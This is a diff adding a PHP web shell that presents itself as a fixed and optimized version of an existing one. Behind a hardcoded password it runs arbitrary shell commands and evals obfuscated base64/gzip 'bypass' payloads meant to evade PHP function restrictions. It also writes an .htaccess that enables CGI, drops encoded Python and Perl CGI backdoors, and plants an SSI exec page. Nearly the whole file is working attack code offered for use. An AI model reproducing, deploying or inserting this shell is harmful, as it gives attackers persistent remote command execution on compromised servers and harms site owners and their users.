@@ -1,0 +1,229 @@
+<?php
+/**
+ * Fixed and Optimized Web Shell
+ * Original: https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/23bin
+ * Fixes: Added authentication, fixed CGI summoning, optimized bypass payloads.
+ */
+
+// --- CONFIGURATION ---
+$password = "Lewster1337@$"; // Default password
+$nm   = 'user';
+$serv = gethostname();
+
+// --- AUTHENTICATION ---
+session_start();
+if (isset($_GET['logout'])) {
+    unset($_SESSION['logged_in']);
+    session_destroy();
+    header("Location: ?");
+    exit;
+}
+
+if (!isset($_SESSION['logged_in'])) {
+    if (isset($_POST['pass']) && $_POST['pass'] === $password) {
+        $_SESSION['logged_in'] = true;
+    } else {
+        ?>
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Login Required</title>
+            <style>
+                body { background: #0a001a; color: #00fceb; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+                .login-box { background: #1c0033; padding: 30px; border: 2px solid #00fceb; border-radius: 10px; box-shadow: 0 0 20px #00fceb; }
+                input[type=password] { background: #2a004d; border: 1px solid #00fceb; color: #fff; padding: 10px; border-radius: 5px; width: 200px; }
+                input[type=submit] { background: #00fceb; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+            </style>
+        </head>
+        <body>
+            <div class="login-box">
+                <form method="post">
+                    <h2>Access Denied</h2>
+                    <input type="password" name="pass" placeholder="Password" autofocus>
+                    <input type="submit" value="Login">
+                </form>
+            </div>
+        </body>
+        </html>
+        <?php
+        exit;
+    }
+}
+
+// --- CORE LOGIC ---
+$activeBox = '';
+$contentNormal = '';
+if (isset($_POST['normalcmd']) && isset($_POST['command'])) {
+    $command = $_POST['command'];
+    $activeBox = 'normalBox';
+    ob_start();
+    $descriptors = [0 => ["pipe","r"], 1 => ["pipe","w"], 2 => ["pipe","w"]];
+    $process = @proc_open($command, $descriptors, $pipes);
+    if (is_resource($process)) {
+        fwrite($pipes[0], "y\n");
+        fclose($pipes[0]);
+        echo stream_get_contents($pipes[1]);
+        echo stream_get_contents($pipes[2]);
+        proc_close($process);
+    } else {
+        echo "Failed to open process.";
+    }
+    $contentNormal = ob_get_clean();
+}
+
+$content7 = '';
+if (!empty($_POST['cmd7'])) {
+    $x = $_POST['cmd7'];
+    $activeBox = 'php7Box'; 
+    ob_start();
+    $reqex = "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";
+    @eval("?>".gzuncompress(base64_decode($reqex)));
+    $content7 = ob_get_clean();
+}
+
+$content8 = '';
+if (!empty($_POST['cmd8'])) {
+    $x = $_POST['cmd8'];
+    $activeBox = 'php8Box';
+    ob_start();
+    $reqex = "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";
+    @eval("?>".gzuncompress(base64_decode($reqex)));
+    $content8 = ob_get_clean();
+}
+
+$cgiResult = '';
+if (isset($_POST['summon'])) {
+    $activeBox = 'cgiBox';
+    $op = $_POST['option'];
+    $cgipy = "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";
+    $cgipl = "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";
+    
+    if (!is_dir('t0ku_cgi')) mkdir('t0ku_cgi', 0755);
+    $isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \nAddType application/x-httpd-cgi .99 \nAddHandler cgi-script .99 \nAddHandler cgi-script .99";
+    file_put_contents('t0ku_cgi/.htaccess', $isi_htcgi);
+    
+    if ($op == 'cgipy') {
+        file_put_contents('t0ku_cgi/cgipy.99', gzuncompress(base64_decode($cgipy)));
+        chmod('t0ku_cgi/cgipy.99', 0755);
+        $cgiResult = "Successfully Summoned <b>CGI (Py)</b><br> Password : <b>Lewster1337</b><br><a href='t0ku_cgi/cgipy.99' target='_blank'>[Open CGI Here]</a>";
+    } else {
+        file_put_contents('t0ku_cgi/cgipl.99', gzuncompress(base64_decode($cgipl)));
+        chmod('t0ku_cgi/cgipl.99', 0755);
+        $cgiResult = "Successfully Summoned <b>CGI (Light)</b><br> Password : <b>Lewster1337</b><br><a href='t0ku_cgi/cgipl.99' target='_blank'>[Open CGI Here]</a>";
+    }
+}
+
+$shtmlResult = '';
+if (isset($_POST['summon_shtml'])) {
+    $activeBox = 'shtmlBox';
+    $shtml_content = "<!--#exec cmd=\"ls -la\" -->";
+    file_put_contents('index.shtml', $shtml_content);
+    $shtmlResult = "Successfully Summoned <b>index.shtml</b><br><a href='index.shtml' target='_blank'>[Open SHTML Here]</a>";
+}
+
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Advanced Terminal - Fixed</title>
+    <style>
+    body { margin:0; padding:0; background:#0a001a; color:#fff; font-family:sans-serif; }
+    header { background:#0f0027; padding:10px 20px; border-bottom:3px solid #00fceb; display:flex; justify-content: space-between; align-items:center; }
+    header h1 { margin:0; font-size:1.3em; color:#00fceb; text-shadow: 0 0 5px #00fceb; }
+    .logout-btn { color: #ff4d4d; text-decoration: none; font-weight: bold; }
+    .container { padding:20px; }
+    .menu-bar button { background:#00fceb; color:#0f0027; border:none; padding:8px 16px; cursor:pointer; border-radius:4px; font-weight:bold; margin-right:10px; margin-bottom:10px; transition: background 0.2s; }
+    .menu-bar button:hover { background:#33ffee; box-shadow:0 0 8px #00fceb; }
+    .term-box { display:none; background:#1c0033; border:2px solid #00fceb; border-radius:6px; padding:20px; margin-bottom:20px; }
+    .term-box h2 { color:#00fceb; margin-top:0; text-shadow: 0 0 5px #00fceb; }
+    input[type=text], select { width:100%; background:#2a004d; border:1px solid #3b006b; color:#fff; border-radius:4px; padding:8px; margin-bottom:8px; }
+    .btn-submit { background:#00fceb; color:#0f0027; border:none; padding:8px 16px; cursor:pointer; border-radius:4px; font-weight:bold; margin-top:5px; }
+    .output-area { width:100%; height:300px; background:#0a001a; border:1px solid #3b006b; border-radius:6px; color:#fff; padding:10px; font-family:monospace; margin-top:5px; white-space:pre; overflow:auto; resize:vertical; }
+    </style>
+</head>
+<body>
+<header>
+  <h1>Advanced Terminal</h1>
+  <a href="?logout=1" class="logout-btn">Logout</a>
+</header>
+
+<div class="container">
+  <div class="menu-bar">
+    <button type="button" onclick="showTerminal('normalBox')">Terminal Biasa</button>
+    <button type="button" onclick="showTerminal('php7Box')">Terminal Bypass PHP V1</button>
+    <button type="button" onclick="showTerminal('php8Box')">Terminal Bypass PHP V2</button>
+    <button type="button" onclick="showTerminal('cgiBox')">Summon CGI</button>
+    <button type="button" onclick="showTerminal('shtmlBox')">Summon index.shtml</button>
+  </div>
+
+  <div id="normalBox" class="term-box">
+    <h2>Terminal Biasa</h2>
+    <form method="post">
+      <input type="text" name="command" placeholder="ls -la" value="<?php echo isset($_POST['command']) ? htmlspecialchars($_POST['command']) : ''; ?>">
+      <input type="submit" name="normalcmd" class="btn-submit" value="Run Normal">
+    </form>
+    <?php if ($contentNormal): ?>
+      <textarea class="output-area" readonly><?php echo htmlspecialchars($contentNormal); ?></textarea>
+    <?php endif; ?>
+  </div>
+
+  <div id="php7Box" class="term-box">
+    <h2>Terminal Bypass PHP V1</h2>
+    <form method="post">
+      <input type="text" name="cmd7" placeholder="ls -la" value="<?php echo isset($_POST['cmd7']) ? htmlspecialchars($_POST['cmd7']) : ''; ?>">
+      <input type="submit" class="btn-submit" value="Run Bypass V1">
+    </form>
+    <?php if ($content7): ?>
+      <textarea class="output-area" readonly><?php echo htmlspecialchars($content7); ?></textarea>
+    <?php endif; ?>
+  </div>
+
+  <div id="php8Box" class="term-box">
+    <h2>Terminal Bypass PHP V2</h2>
+    <form method="post">
+      <input type="text" name="cmd8" placeholder="ls -la" value="<?php echo isset($_POST['cmd8']) ? htmlspecialchars($_POST['cmd8']) : ''; ?>">
+      <input type="submit" class="btn-submit" value="Run Bypass V2">
+    </form>
+    <?php if ($content8): ?>
+      <textarea class="output-area" readonly><?php echo htmlspecialchars($content8); ?></textarea>
+    <?php endif; ?>
+  </div>
+
+  <div id="cgiBox" class="term-box">
+    <h2>Summon CGI</h2>
+    <form method="post">
+      <select name="option">
+         <option value="cgi">Light CGI (Perl)</option>
+         <option value="cgipy">Python CGI</option>
+      </select>
+      <input type="submit" class="btn-submit" name="summon" value="Summon CGI">
+    </form>
+    <?php if ($cgiResult): ?>
+      <div style="margin-top:10px;"><?php echo $cgiResult; ?></div>
+    <?php endif; ?>
+  </div>
+
+  <div id="shtmlBox" class="term-box">
+    <h2>Summon index.shtml</h2>
+    <form method="post">
+      <input type="submit" name="summon_shtml" class="btn-submit" value="Summon index.shtml">
+    </form>
+    <?php if ($shtmlResult): ?>
+      <div style="margin-top:10px;"><?php echo $shtmlResult; ?></div>
+    <?php endif; ?>
+  </div>
+</div>
+
+<script>
+function showTerminal(id) {
+  document.querySelectorAll('.term-box').forEach(el => el.style.display = 'none');
+  document.getElementById(id).style.display = 'block';
+}
+<?php if ($activeBox): ?>
+showTerminal('<?php echo $activeBox; ?>');
+<?php else: ?>
+showTerminal('normalBox');
+<?php endif; ?>
+</script>
+</body>
+</html>
